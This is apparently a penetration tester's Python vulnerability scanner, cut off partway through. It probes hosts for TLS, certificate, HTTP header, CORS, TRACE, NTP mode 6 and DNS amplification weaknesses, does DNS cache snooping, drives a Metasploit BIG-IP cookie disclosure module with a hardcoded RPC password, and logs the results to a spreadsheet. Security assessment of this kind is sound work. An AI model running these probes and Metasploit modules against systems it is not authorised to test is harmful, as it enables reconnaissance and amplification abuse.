import sys
from subprocess import STDOUT, check_output
import os
from requests import Session, Request
import re
import urllib3
import argparse
from pymetasploit3.msfrpc import MsfRpcClient
import socket
from OpenSSL import SSL
from service_identity import VerificationError
from cryptography import x509
from cryptography.x509.oid import NameOID
import idna
import signal
import concurrent.futures
from collections import namedtuple
import requests
import threading
import queue
from datetime import datetime, timedelta
import time
import xlsxwriter
from random import randrange
from scapy.all import *
import socket 
import sys 
from termcolor import colored, cprint 
import jwt
import base64
import ast
import binascii
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#JWT https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py
#JWT Exploitation
#DNS Cache snooping add to xls
#HTTPS Enforced check
#BIGIP timeout 
#BIGIP grep for port
#extractPath check (Win not working)
#check ssl enabled https://stackoverflow.com/questions/51423507/how-to-extract-an-ssl-tls-message-using-scapy-and-python
#ssl check https://gist.github.com/gdamjan/55a8b9eec6cf7b771f92021d93b87b2c

start=time.time()

ipList = set()
expiredCerts = {}
soonToExpireCerts = {}
anonCiphersStore = {}
httpsNotEnforced = {}
httpsNotEnabled = {}
verboseServerBannerContentStore = {}
verboseServerBannerStore = {}
hostHeaderInjectionStore = {}
HSTSMisconfig = {}
internalIPDisclosureStore = {}
bigIPDisclosureStore = {}
ssrfStore = {} 
verboseServerErrorStore = {}
extractPathStore = {}
TLS1 = {}
SSL3 = {}
SSL2 = {}
ntpStore = {}
numerOfRedirects = 0
missingOrInsecureHeaders = {}
storeOpenPorts = {}
traceEnabled = {}
dnsPortCheck = set()
dnsDOSStore = {}
sessCookie = {}

workbook = xlsxwriter.Workbook('Vulnerability_Results.xlsx') 
bold = workbook.add_format({'bold': True})
cell_format = workbook.add_format()
cell_format.set_text_wrap()
worksheet = workbook.add_worksheet("SSL Vulnerabilities") 
worksheetWeb = workbook.add_worksheet("Web Vulnerabilities") 
worksheetNetwork = workbook.add_worksheet("Network Vulnerabilities") 
worksheet.write(0, 0, "Certificate Expired", bold)
worksheet.write(0, 1, "All information", bold)
worksheet.write(0, 3, "Certificate will expire soon", bold)
worksheet.write(0, 4, "All information", bold)
worksheet.write(0, 6, "Anonymous SSL/TLS ciphers supported", bold)
worksheet.write(0, 7, "All information", bold)
worksheet.write(0, 9, "HTTPS Not Enabled", bold)
worksheet.write(0, 10, "All information", bold)
worksheet.write(0, 12, "HTTPS Not Enforced", bold)
worksheet.write(0, 13, "All information", bold)
worksheet.write(0, 15, "HSTS Missing or Misconfigured", bold)
worksheet.write(0, 16, "All information", bold)
worksheet.write(0, 18, "SSLv2 Enabled", bold)
worksheet.write(0, 19, "SSLv3 Enabled", bold)
worksheet.write(0, 20, "TLSv1.0 Enabled", bold)

worksheetWeb.write(0, 0, "Verbose Server Banner", bold)
worksheetWeb.write(0, 1, "Disclosed Header", bold)
worksheetWeb.write(0, 3, "Verbose Server Banner in Response", bold)
worksheetWeb.write(0, 4, "Request Headers", bold)
worksheetWeb.write(0, 6, "Host Header Injection", bold)
worksheetWeb.write(0, 7, "Request Headers", bold)
worksheetWeb.write(0, 9, "Internal IP Disclosure", bold)
worksheetWeb.write(0, 10, "Disclosed IP Address", bold)
worksheetWeb.write(0, 12, "BigIP Cookie Internal IP Disclosure", bold)
worksheetWeb.write(0, 13, "Disclosed IP Address", bold)
worksheetWeb.write(0, 15, "Server Side Request Forgery", bold)
worksheetWeb.write(0, 16, "Vulnerable parameter", bold)
worksheetWeb.write(0, 18, "Verbose Server Error", bold)
worksheetWeb.write(0, 19, "Exception", bold)
worksheetWeb.write(0, 21, "Internal Path Disclosure", bold)
worksheetWeb.write(0, 22, "Exception", bold)
worksheetWeb.write(0, 24, "Missing or Misconfigured Headers", bold)
worksheetWeb.write(0, 25, "Information", bold)
worksheetWeb.write(0, 27, "TRACE method enabled", bold)

worksheetNetwork.write(0, 0, "Network Time Protocol (NTP) Mode 6 Scanner DOS", bold)
worksheetNetwork.write(0, 1, "Response", bold)
worksheetNetwork.write(0, 3, "Domain Name System (DNS) DOS", bold)
worksheetNetwork.write(0, 4, "Information", bold)


def signal_handler(sig, frame):
        os.system("stty sane")
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


#Helper Functions
def proxyError(e, method, sessCookie):
	
	if "Cannot connect to proxy" in str(e):
		
		if method == "scan":
			cprint("\nCannot connect to proxy\n\nPlease enable proxy to continue scanning\n", 'red', attrs=['bold'])
			sys.exit()

		else:	
			address = "https://www.google.com"
		
			while True:
				try:
					headers = None
					proxyCheck = oneRequest(headers, address, sessCookie)

					if proxyCheck.status_code:
						break
					else:
						
						time.sleep(2)
						continue

				except Exception as e:

					if "Cannot connect to proxy" in str(e):
						
						time.sleep(2)
						continue
					else:
						break
			return

	else:		
		return


def portOpenCheck(IP, port):

	target = IP

	def portscan(port):

	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    s.settimeout(0.5)# 

	    try:
	    	con = s.connect((target,port))
	    	
	    	print('Port :',port,"is open.")
	    	con.close()
	    except Exception as e: 
	    	
	    	pass
	r = 1 

	for x in range(1,100): 

	    t = threading.Thread(target=portscan,kwargs={'port':r}) 

	    r += 1     
	    t.start() 


def oneRequest(headers, address, sessCookie):

	if headers != None:
		result = requests.get(address, verify=False, cookies=sessCookie, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
	else:	
		result = requests.get(address, verify=False, cookies=sessCookie, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
	
	return result


def allRedirectRequests(headers, IP, port, redirectUrl, sessCookie):
	

	redirectUrl1 = str(redirectUrl.url)

	if "location" in str(redirectUrl.headers).lower() and "https" not in str(redirectUrl.headers["Location"]) and "http" not in str(redirectUrl.headers["Location"]):
		redirectUrl1 = "{}{}".format(str(redirectUrl.url), str(redirectUrl.headers["Location"]))
		#print(redirectUrl1)

	elif "location" in str(redirectUrl.headers).lower():
		redirectUrl1 = str(redirectUrl.url)
	
	try:
	
		redirectData = requests.get(redirectUrl1, verify=False,  cookies=sessCookie, proxies=proxyDict, headers=headers, allow_redirects=True, timeout=(5, 8))

		return redirectData

	except Exception as e:
		 
		replace = 1
		return None


def extractPath(data, IP, port, fromMethod):
	

	resultPath = set()

	regWin = (re.findall( r'([a-zA-Z]\:|\\\\[^\/\\:*?"<>|]+\\[^\/\\:*?"<>|]+)(\\[^\/\\:*?"<>|]+)+(\.[^\/\\:*?"<>|]+)$', data))

	#Linux
	regex = r"((?!.*//.*)(?!.*/ .*)/{1}([^\\(){}:\*\?<>\|\"\'])+\.(cpp|deb|bz2|bin|pid|lock|iso|zip|wav|xwd|tgz|html|conf|dat))"

	matches = re.search(regex, data)
	
	if matches == None or "/js/" in matches.group():
		empty = 1

	else:
		resultPath.add("{}".format(matches))
		instance = "{}:{}".format(IP, port)
		extractPathStore.update({instance:str(matches.group())})

	if regWin == []:
		empty = 1
	else:
		resultPath.add("{}".format(regWin))
		instance = "{}:{}".format(IP, port)
		extractPathStore.update({instance:str(regWin)})

	if extractPathStore == {} and fromMethod == "iid":
		print(colored('{0:<40}'.format("Internal Path Disclosure:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	elif extractPathStore != {} and fromMethod == "iid":
		converted = ', '.join(resultPath)
		instance = "{}:{}".format(IP, port)
		str1 = ''.join(extractPathStore[instance])
		print(colored('{0:<40}'.format("Internal Path Disclosure:"), 'white', attrs=['bold']), colored("Vulnerable: {}".format(extractPathStore[instance]), 'red'))

	

def extractIP(extractIPFromString, IP, port, data):

	regex = (re.findall( r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})', str(extractIPFromString)))
	import json

	resultInternalIP = set()
	for ip in regex:

		if ip.startswith("10.") or ip.startswith("192.168."):
			resultInternalIP.add("Vulnerable: {}".format(ip))
			ipList.add(ip)

			if data == "iid":
				instance = "{}:{}".format(IP, port)
				internalIPDisclosureStore.update({instance:str(ip)})

			if data == "msfconsole":
				instance = "{}:{}".format(IP, port)
				bigIPDisclosureStore.update({instance:str(ip)})

		elif ip.startswith("172.") and int(ip.split(".")[1]) >= 16 and int(ip.split(".")[1]) <= 31:
			resultInternalIP.add("Vulnerable: {}".format(ip))
			ipList.add(ip)

			if data == "iid":
				instance = "{}:{}".format(IP, port)
				internalIPDisclosureStore.update({instance:str(ip)})

			if data == "msfconsole":
				instance = "{}:{}".format(IP, port)
				bigIPDisclosureStore.update({instance:str(ip)})

	if len(resultInternalIP) == 0:
		print(colored('{0:<40}'.format("Internal IP Disclosure:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	else:
		converted = ', '.join(resultInternalIP)
		print(colored('{0:<40}'.format("Internal IP Disclosure:"), 'white', attrs=['bold']), colored(converted, 'red'))



def msfconsole(IP, port):
	
	try:
		client = MsfRpcClient('toortoor', port=55553, ssl=True)
	except:
		return

	exploit = client.modules.use('auxiliary','gather/f5_bigip_cookie_disclosure')
	exploit['RHOSTS'] = IP
	exploit['RPORT'] = int(port)
	exploit['SSL']= False

	try:
		console_id = client.consoles.console().cid
		console = client.consoles.console(console_id)
		extractIP(console.run_module_with_output(exploit), IP, port, "msfconsole")

	except:
		cprint ("Connection failed", 'red', attrs=['bold'])


def hstsCheck(data, IP, port):
		
	if 'strict-transport-security' not in data.headers:
		print(colored('{0:<40}'.format("strict-transport-security:"), 'white', attrs=['bold']), colored("Header Missing", 'red'))
		instance = "{}:{}".format(IP, port)
		HSTSMisconfig.update({instance:"Missing"})

	else:
		values = data.headers['strict-transport-security']
		max_age = int("".join(filter(str.isdigit, values)))
		
		if 'max-age' not in data.headers['strict-transport-security'] or max_age < 10886400:
			print(colored('{0:<40}'.format("strict-transport-security:"), 'white', attrs=['bold']), colored("HSTS not implemented properly: max-age should be at least eighteen weeks", 'red'))
			instance = "{}:{}".format(IP, loopPorts)
			HSTSMisconfig.update({instance:"Misconfigured"})

		else:
			print(colored('{0:<40}'.format("strict-transport-security:"), 'white', attrs=['bold']), colored("Implemented Correctly", 'green'))


#Network Functions
def ntpMode6(IPAddress):

	print(colored('{0:<40}'.format("Network Time Protocol DOS:"), 'white', attrs=['bold']), colored("", 'yellow'), end="\r")
	ntpserver = IPAddress
	data = "\x16\x02\x00\x01" + "\x00" * 8
	
	packets = IP(dst=ntpserver)/UDP(sport=48947,dport=123)/Raw(load=data) 
	send(packets, verbose=0)
	resultNTP = sniff(iface="eth0",timeout = 2)

	flag = 0
	try:
		for i in range (0,9):
					
			if "processor" in str(resultNTP[i]) and "rootdelay" in str(resultNTP[i]):
				flag = 1
				print(colored('{0:<40}'.format("Network Time Protocol DOS:"), 'white', attrs=['bold']), colored("NTP Server replied to Mode 6 queries. Potential to be used in NTP amplification attacks", 'red'))
				instance = str(IPAddress) + ":123u"
				ntpStore.update({instance:str(resultNTP[i])})
				break

	except Exception as e:
			replace = 1
			
	if flag == 0:
		print(colored('{0:<40}'.format("Network Time Protocol DOS:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
				


def dnsDOS(IPAddress):

	print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("", 'yellow'), end="\r")
	query_types = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]
	query_name = "www.google.com"
	time_to_live = 128 

	query = ""
	queryResult = {}
	for queryType in query_types:
		packet = IP(dst=IPAddress, ttl=time_to_live) / UDP() / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=queryType))

		try:
			query = sr1(packet,verbose=False, timeout=8)
			ampFactor = len(packet) / len(query)
			queryResult.update({queryType:ampFactor})

		except Exception as e:
			# 
			errorReceived = 1
	
	
	count = 0
	if queryResult != {}:
		for i in queryResult:
			if queryResult.get(i) > count:
				try:
					storeHighestValue = "Query Type: {}, Amplification Factor: {}, Request: {} bytes, Response: {} bytes".format(i, queryResult.get(i), len(query), len(packet))
				except:
					continue

	try:
		if queryResult != {}:
			if query[DNS].ra == 0:
		
				if ampFactor < 4:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Disabled".format(storeHighestValue), 'green'))
				elif ampFactor >= 4 and ampFactor <= 8:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Disabled".format(storeHighestValue), 'yellow'))
				elif ampFactor > 8:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Disabled".format(storeHighestValue), 'red'))

			elif query[DNS].ra == 1:

				if ampFactor < 4:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Enabled".format(storeHighestValue), 'green'))
				elif ampFactor >= 4 and ampFactor <= 8:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Enabled".format(storeHighestValue), 'yellow'))
				elif ampFactor > 8:
					print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("{}, Recursion: Enabled".format(storeHighestValue), 'red'))

			dnsDOSStore.update({IPAddress:storeHighestValue})
		else:
			print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("Error connecting to server", 'yellow'))
	except:
		# 
		print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("Error connecting to server", 'yellow'))



def dnsCacheSnooping(IPAddress):

	import ipaddress

	print(colored('{0:<40}'.format("Domain Name System Cache Snooping:"), 'white', attrs=['bold']), colored("", 'yellow'), end="\r")

	domainList = ["google.com","facebook.com","youtube.com","yahoo.com","baidu.com","wikipedia.org","amazon.com","qq.com","live.com","linkedin.com","twitter.com","blogspot.com","taobao.com","google.co.in","bing.com",
  "yahoo.co.jp","yandex.ru","wordpress.com","sina.com.cn","vk.com","ebay.com","google.de","tumblr.com","msn.com","google.co.uk","googleusercontent.com","ask.com","mail.ru","google.com.br","163.com","google.fr","pinterest.com",
  "google.com.hk","hao123.com","microsoft.com","google.co.jp","xvideos.com","google.ru","weibo.com","craigslist.org","paypal.com","instagram.com","amazon.co.jp","google.it","imdb.com","blogger.com","google.es","apple.com",
  "conduit.com","sohu.com","example.com"]

	vulnerable = 0

	for domainName in domainList:
		packet = IP(dst=IPAddress) / UDP(dport=53) / DNS(rd=0, qd=DNSQR(qname=domainName))

		try:
				query = sr1(packet,verbose=False, timeout=8)

				if query[DNS].an == None:
					continue
				else:
					vulnerable = 1
					#print("{}: {}".format(query[DNS].an[DNSRR].rrname, query[DNS].an[DNSRR].rdata))
		except Exception as e:
				replace = 1

	if vulnerable == 1:
		print(colored('{0:<40}'.format("Domain Name System Cache Snooping:"), 'white', attrs=['bold']), colored("Vulnerable\n", 'yellow'))
	else:
		print(colored('{0:<40}'.format("Domain Name System Cache Snooping:"), 'white', attrs=['bold']), colored("Not Vulnerable\n", 'yellow'))


#SSL Functions
def anonCiphers(IP, port):

	try:
		import nmap
		
		argument = "-Pn --script ssl-enum-ciphers -p%s" %port

		nm = nmap.PortScanner()
		nm.scan(IP, arguments=argument)

		storeResult = nm[IP]['tcp'][int(port)]

		storeResult = storeResult.get('script', {}).get('ssl-enum-ciphers')
		
		if "SSLv2:" in str(storeResult):
				print(colored('{0:<40}'.format("SSLv2:"), 'white', attrs=['bold']), colored("Enabled", 'red'))
				instance =  "{}:{}".format(IP, port)
				SSL2.update({instance:str(storeResult)})

		else:
				print(colored('{0:<40}'.format("SSLv2:"), 'white', attrs=['bold']), colored("Not Enabled", 'green'))


		if "SSLv3:" in str(storeResult):
				print(colored('{0:<40}'.format("SSLv3:"), 'white', attrs=['bold']), colored("Enabled", 'red'))
				instance = "{}:{}".format(IP, port)
				SSL3.update({instance:str(storeResult)})
		else:
				print(colored('{0:<40}'.format("SSLv3:"), 'white', attrs=['bold']), colored("Not Enabled", 'green'))

		if "TLSv1.0:" in str(storeResult):
				print(colored('{0:<40}'.format("TLSv1.0:"), 'white', attrs=['bold']), colored("Enabled", 'red'))
				instance = "{}:{}".format(IP, port)
				TLS1.update({instance:str(storeResult)})
		else:
				print(colored('{0:<40}'.format("TLSv1.0:"), 'white', attrs=['bold']), colored("Not Enabled", 'green'))

		if "TLSv1.1:" in str(storeResult):
				print(colored('{0:<40}'.format("TLSv1.1:"), 'white', attrs=['bold']), colored("Enabled", 'white'))
				instance = "{}:{}".format(IP, port)
				TLS1.update({instance:str(storeResult)})
		else:
				print(colored('{0:<40}'.format("TLSv1.1:"), 'white', attrs=['bold']), colored("Not Enabled", 'white'))

		if "TLSv1.2:" in str(storeResult):
				print(colored('{0:<40}'.format("TLSv1.2:"), 'white', attrs=['bold']), colored("Enabled", 'white'))
				instance = "{}:{}".format(IP, port)
				TLS1.update({instance:str(storeResult)})
		else:
				print(colored('{0:<40}'.format("TLSv1.2:"), 'white', attrs=['bold']), colored("Not Enabled", 'white'))


		if "least strength:" in str(storeResult):

			if "least strength: C" in str(storeResult):
				print(colored('{0:<40}'.format("Weak SSL/TLS Ciphers Enabled:"), 'white', attrs=['bold']), colored("Vulnerable", 'red'))
				instance = "{}:{}".format(IP, port)
				anonCiphersStore.update({instance:str(storeResult)})
			else:
				print(colored('{0:<40}'.format("Weak SSL/TLS Ciphers Enabled:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))

		else:
			print(colored('{0:<40}'.format("Weak SSL/TLS Ciphers Enabled:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
			return

	except Exception as e:
		print(colored('{0:<40}'.format("Weak SSL/TLS Ciphers Enabled:"), 'white', attrs=['bold']), colored("¯\\_(ツ)_/¯", 'green'))
		replace = 1
		return


def hsts(data, IP, port, status):

				
	if "https" in status or "ssl" in status:
		
		try:
			hstsCheck(data, IP, port)

		except requests.exceptions.RequestException as e:
			 
			replace = 1
			exception = 1
			
	else:
		return


def httpsEnforced(IP, port, sessCookie):


	headers = {'Host': 'www.oteri.com', 'Upgrade-Insecure-Requests':'1', \
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
	'Connection': 'close'} 

	address = "http://{}:{}".format(IP, port)
	try:
		data = requests.get(address, headers=headers, proxies=proxyDict, verify=False, allow_redirects=True, timeout=(5, 8))
		address = str(data.url)
	except Exception as e:
		address = "http://{}:{}".format(IP, port)

	SSLcon = None
	try:
		SSLcon = oneRequest(headers, address, sessCookie)
	
		if "location" in str((SSLcon.headers)).lower():

			if "https" in SSLcon.headers['Location'].lower():
				print(colored('{0:<40}'.format("HTTPS Enforced:"), 'white', attrs=['bold']), colored("True", 'green'))

			else:
				enabled = 1
				try:
					addreSSL = "https://{}:{}".format(IP, port)
					SSLcon = oneRequest(headers, addreSSL, sessCookie)
				except:	
					enabled = 0
					print(colored('{0:<40}'.format("HTTPS Enabled:"), 'white', attrs=['bold']), colored("False", 'red'))
					instance = "{}:{}".format(IP, port)
					httpsNotEnabled.update({instance:"Disabled"})
				
				if enabled == 1:
					print(colored('{0:<40}'.format("HTTPS Enforced:"), 'white', attrs=['bold']), colored("False", 'red'))
					instance = "{}:{}".format(IP, port)
					httpsNotEnforced.update({instance:"HTTPS Not Enforced"})

		else:

			try:
				addreSSL = "https://{}:{}".format(IP, port)
				SSLcon = oneRequest(headers, addreSSL, sessCookie)

				if SSLcon.status_code != None:
					print(colored('{0:<40}'.format("HTTPS Enabled:"), 'white', attrs=['bold']), colored("True", 'green'))
					enabled = 1
			except:	
				enabled = 0
				print(colored('{0:<40}'.format("HTTPS Enabled:"), 'white', attrs=['bold']), colored("False", 'red'))
				instance = "{}:{}".format(IP, port)
				httpsNotEnabled.update({instance:"Disabled"})

			if enabled == 1:
				print(colored('{0:<40}'.format("HTTPS Enforced:"), 'white', attrs=['bold']), colored("False", 'red'))
				instance = "{}:{}".format(IP, port)
				httpsNotEnforced.update({instance:"HTTPS Not Enforced"})


	except requests.exceptions.RequestException as e:

		print(colored('{0:<40}'.format("HTTPS Enabled:"), 'white', attrs=['bold']), colored("¯\\_(ツ)_/¯", 'yellow'))
		print(colored('{0:<40}'.format("HTTPS Enforced:"), 'white', attrs=['bold']), colored("¯\\_(ツ)_/¯", 'yellow'))
		replace = 1
		exception = 1
		proxyError(e, "", sessCookie)
		

def ssl(IP, loopPorts, status, sessCookie):

	HostInfo = namedtuple(field_names='cert hostname peername', typename='HostInfo')
	from socket import socket

	if "https" in status or "ssl" in status:
		
		anonCiphers(IP, loopPorts)
		httpsEnforced(IP, loopPorts, sessCookie)
		
		HOSTS = [(IP, int(loopPorts))]
		
		try:
			def get_certificate(hostnames, port):

			    hostname = hostnames[0][0]
			    port = hostnames[0][1]
			    hostname = str(hostname)
			    hostname_idna = idna.encode(hostname)
			    sock = socket()

			    sock.connect((hostname, port))
			    peername = sock.getpeername()
			    ctx = SSL.Context(SSL.SSLv23_METHOD) # most compatible
			    ctx.check_hostname = False
			    ctx.verify_mode = SSL.VERIFY_NONE

			    sock_ssl = SSL.Connection(ctx, sock)
			    sock_ssl.set_connect_state()
			    sock_ssl.set_tlsext_host_name(hostname_idna)				    
			    sock_ssl.do_handshake()
			    cert = sock_ssl.get_peer_certificate()
			    crypto_cert = cert.to_cryptography()
			    sock_ssl.close()
			    sock.close()

			    return HostInfo(cert=crypto_cert, peername=peername, hostname=hostname)

			def get_alt_names(cert):
			    
			    try:
			        ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
			        return ext.value.get_values_for_type(x509.DNSName)
			    except x509.ExtensionNotFound:
			        return None

			def get_common_name(cert):
			    
			    try:
			        names = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
			        return names[0].value
			    except x509.ExtensionNotFound:
			        return None

			def get_issuer(cert):
			    
			    try:
			        names = cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)
			        return names[0].value
			    except x509.ExtensionNotFound:
			        return None


			def print_basic_info(hostinfo):
			    
			    #print(hostinfo.cert.not_valid_after)
			    datetimes = hostinfo.cert.not_valid_after
			    datetimes = str(datetimes)
			    datetimes = datetimes.split(" ")
			    datetimes = datetimes[0].split("-")
			    present = datetime.now()
			    #print(datetimes[0])
			    #print(datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) < present)

			    s = '''\n» {hostname} « … {peername}
			    \tcommonName: {commonname}
			    \tSAN: {SAN}
			    \tissuer: {issuer}
			    \tnotBefore: {notbefore}
			    \tnotAfter:  {notafter}
			    '''.format(
			            hostname=hostinfo.hostname,
			            peername=hostinfo.peername,
			            commonname=get_common_name(hostinfo.cert),
			            SAN=get_alt_names(hostinfo.cert),
			            issuer=get_issuer(hostinfo.cert),
			            notbefore=hostinfo.cert.not_valid_before,
			            notafter=hostinfo.cert.not_valid_after
			    )
			    
			    if (datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) < present) == True:
			    	print(colored('{0:<40}'.format("Certificate Expiry:"), 'white', attrs=['bold']), colored("Expired", 'red'))
			    	instance = "{}:{}".format(IP, loopPorts)
			    	expiredCerts.update({instance:str(s)})
			    else:
				    daysRemaining = str(datetime(int(datetimes[0]), int(datetimes[1]), int(datetimes[2])) - present)
				    daysRemaining = daysRemaining.split(" ")
				    
				    if int(daysRemaining[0]) <= 60:
				    	print(colored('{0:<40}'.format("Certificate Expiry:"), 'white', attrs=['bold']), colored("Certificate will expire in less than 60 days", 'yellow'))
				    	instance = "{}:{}".format(IP, loopPorts)
				    	soonToExpireCerts.update({instance:str(s)})

				    else:
				    	print(colored('{0:<40}'.format("Certificate Expiry:"), 'white', attrs=['bold']), colored("Certificate Valid", 'green'))

			    cprint(s, 'white', attrs=['bold'])

			def check_it_out(hostname, port):
			    hostinfo = get_certificate(hostname, port)
			    print_basic_info(hostinfo)

			check_it_out(HOSTS, loopPorts)

	
		except Exception as e:
			# 
			print(colored('{0:<40}'.format("Certificate Expiry:"), 'white', attrs=['bold']), colored("¯\\_(ツ)_/¯", 'yellow'))
			count = "buff!"
			replace = 1

	else:
		print(colored('{0:<40}'.format("Certificate Expiry:"), 'white', attrs=['bold']), colored("¯\\_(ツ)_/¯", 'yellow'))
		httpsEnforced(IP, loopPorts, sessCookie)


def traceMethod(IP, loopPorts, status):

	response = socketRequestHelperMethod(IP, loopPorts, status, "trace")

	if "TRACE / HTTP/1.1" in response or "message/http" in response:
		print(colored('{0:<40}'.format("TRACE HTTP Method:"), 'white', attrs=['bold']), colored("Method Enabled", 'red'))
		instance = "{}:{}".format(IP, loopPorts)
		traceEnabled.update({instance:"trace"})

	else:
		print(colored('{0:<40}'.format("TRACE HTTP Method:"), 'white', attrs=['bold']), colored("Not Enabled", 'green'))


#All Header Functions
def cacheControl(data, IP, loopPorts):

	resultCache = set()

	if "Cache-Control" in str(data.headers):
		
		if "no-cache" in str(data.headers["Cache-Control"]) and "no-store" in str(data.headers["Cache-Control"]):
			sett = 1
		
		else:
			resultCache.add("Misconfigured")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Cache-Control: Misconfigured"})

	elif "cache-control" in str(data.headers):
		
		if "no-cache" in str(data.headers["cache-control"]) and "no-store" in str(data.headers["cache-control"]):
			sett = 1
		
		else:
			resultCache.add("Misconfigured")
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Cache-Control: Misconfigured"})

	else:
		resultCache.add("Not implemented")
		instance = "{}:{}".format(IP, loopPorts)
		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Cache-Control: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
	
		else:
			missingOrInsecureHeaders.update({instance:"Cache-Control: Missing"})

	if len(resultCache) == 0:
		print(colored('{0:<40}'.format("Cache Control:"), 'white', attrs=['bold']), colored("Set", 'green'))
	
	else:
		converted = ', '.join(resultCache)
		print(colored('{0:<40}'.format("Cache Control:"), 'white', attrs=['bold']), colored(converted, 'red'))



def originHeaderCORS(data, IP, loopPorts):

	resultACAO = set()

	if "Access-Control-Allow-Origin" in str(data.headers):
		
		if "*" in str(data.headers["Access-Control-Allow-Origin"]):
			resultACAO.add("Misconfigured CORS -> Access-Control-Allow-Origin: {}".format(str(data.headers["Access-Control-Allow-Origin"])))
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Access-Control-Allow-Origin: Misconfigured - Broadly Scoped Origin")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Access-Control-Allow-Origin: Misconfigured - Broadly Scoped Origin"})

		elif "www.custom-origin-header.com" in str(data.headers["Access-Control-Allow-Origin"]):
			resultACAO.add("Misconfigured CORS -> Access-Control-Allow-Origin: {}".format(str(data.headers["Access-Control-Allow-Origin"])))
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Access-Control-Allow-Origin: Misconfigured - Origin reflected")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Access-Control-Allow-Origin: Misconfigured - Origin reflected"})

	elif "Timing-Allow-Origin" in str(data.headers):
		
		if "*" in str(data.headers["Timing-Allow-Origin"]):
			resultACAO.add("Misconfigured CORS -> Timing-Allow-Origin: {}".format(str(data.headers["Timing-Allow-Origin"])))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Timing-Allow-Origin: Misconfigured - Broadly Scoped Origin")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Timing-Allow-Origin: Misconfigured - Broadly Scoped Origin"})

		elif "www.custom-origin-header.com" in str(data.headers["Timing-Allow-Origin"]):
			resultACAO.add("Misconfigured CORS -> Timing-Allow-Origin: {}".format(str(data.headers["Timing-Allow-Origin"])))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Timing-Allow-Origin: Misconfigured - Origin reflected")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Timing-Allow-Origin: Misconfigured - Origin reflected"})

	elif "www.custom-origin-header.com" in str(data.headers) or "www.custom-origin-header.com" in str(data.content):
		resultACAO.add("Misconfigured CORS: Origin header value reflected in response headers/content")
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "CORS 'Origin' header reflected: Please check")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"CORS 'Origin' header reflected: Please check"})

	if len(resultACAO) == 0:
		print(colored('{0:<40}'.format("Cross Origin Resource Sharing Policy:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	else:
		converted = ', '.join(resultACAO)
		print(colored('{0:<40}'.format("Cache Control:"), 'white', attrs=['bold']), colored(converted, 'red'))

	

			
def xForwardedFor(data, IP, loopPorts):

